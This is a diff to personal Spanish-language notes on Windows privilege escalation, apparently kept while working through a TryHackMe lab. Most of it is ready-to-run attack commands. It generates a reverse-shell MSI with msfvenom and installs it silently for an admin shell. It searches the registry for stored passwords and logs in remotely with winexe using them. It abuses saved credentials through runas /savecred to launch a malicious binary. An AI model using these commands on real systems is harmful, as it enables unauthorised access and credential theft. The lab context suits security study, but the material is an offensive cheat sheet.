@@ -1,3 +1,7 @@
+walkthroughts:
+https://tryhackme.com/room/windows10privesc
+
+
 TOOLS:
 
 Seatbelt: 	C# project for performing a wide variety of local privilege escalation checks
@@ -114,6 +118,32 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA_IP LPORT=PUERTO -f msi -
 
 lo instalamos y se nos va a generar una shell reversa con permisos de admin.
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+
+
+##################################################################################### PASSWORDS
+
+##########################REGISTRY
+
+podemos buscar passwords en el registro de windows: 
+Usualmente, si están, se encuentran en el archivo winlogon. De esta forma podemos listarlo:
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+De no estar ahí podemos expandir nuestra búsqueda listando archivos del registro que tengan la key o el value "password" y luego volver a listar cada uno con el comando anterior:
+reg query HKLM /f password /t REG_SZ /s
+
+si encontramos la password podemos conectarnos desde kali con el winexe:
+winexe -U 'admin%password' //IP-VICTIMA cmd.exe
+
+
+######################## SAVED CREDS
+
+Podemos listar las credenciales guardadas en el sistema con el siguiente comando:
+cmdkey /list
+
+Si entre las credenciales guardadas aparecen las del admin(no vamos a ver la password) podemos correr nuestro binario malicioso como admin y tener una reverse shell:
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
 
 
 
